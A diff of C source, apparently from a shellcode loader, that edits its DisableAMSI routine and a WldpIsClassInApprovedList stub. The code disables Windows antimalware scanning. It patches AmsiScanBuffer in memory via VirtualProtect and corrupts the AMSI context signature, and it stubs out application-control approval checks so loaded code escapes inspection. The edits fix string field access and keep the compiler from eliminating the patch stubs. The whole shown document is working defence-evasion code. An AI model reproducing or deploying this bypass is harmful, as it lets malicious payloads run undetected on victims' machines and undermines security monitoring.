@@ -66,8 +66,9 @@ HRESULT WINAPI AmsiScanBufferStub(
 // the length of AmsiScanBufferStub above.
 //
 // The reason it performs a multiplication is because MSVC can identify
-// functions that perform the same operation and eliminate duplicates
-// from the compiled code. Null subroutines are eliminated.
+// functions that perform the same operation and eliminate them
+// from the compiled code. Null subroutines are eliminated, so the body of
+// function needs to do something.
 
 int AmsiScanBufferStubEnd(int a, int b) {
     return a * b;
@@ -96,7 +97,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 
     // try load amsi. if unable, assume DLL doesn't exist
     // and return TRUE to indicate it's okay to continue
-    dll = inst->api.LoadLibraryA(inst->amsi.s);    
+    dll = inst->api.LoadLibraryA(inst->amsi);    
     if(dll == NULL) return TRUE;
     
     // resolve address of AmsiScanBuffer. if not found,
@@ -164,7 +165,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     // try load amsi. if unable to load, assume
     // it doesn't exist and return TRUE to indicate
     // it's okay to continue.
-    dll = inst->api.LoadLibraryA(inst->amsi.s);
+    dll = inst->api.LoadLibraryA(inst->amsi);
     if(dll == NULL) return TRUE;
     
     // resolve address of AmsiScanBuffer. if unable, return
@@ -176,7 +177,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     for(i=0;;i++) {
       Signature = (PDWORD)&cs[i];
       // is it "AMSI"?
-      if(*Signature == inst->amsi.w[0]) {
+      if(*Signature == *(PDWORD)inst->amsi) {
         // set memory protection for write access
         inst->api.VirtualProtect(cs, sizeof(DWORD), 
           PAGE_EXECUTE_READWRITE, &op);
@@ -248,7 +249,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
           {
             ctx = (_PHAMSICONTEXT)ptr;
             // check if it contains the signature 
-            if(ctx->Signature == inst->amsi.w[0]) {
+            if(ctx->Signature == *(PDWORD*)inst->amsi) {
               // corrupt it
               ctx->Signature++;
               disabled = TRUE;
@@ -284,8 +285,8 @@ HRESULT WINAPI WldpIsClassInApprovedListStub(
     return S_OK;
 }
 
-// make sure prototype is different from other null subroutines
-// to avoid duplication by MSVC
+// make sure prototype and code are different from other subroutines
+// to avoid removal by MSVC
 int WldpIsClassInApprovedListStubEnd(int a, int b) {
   return a - b;
 }
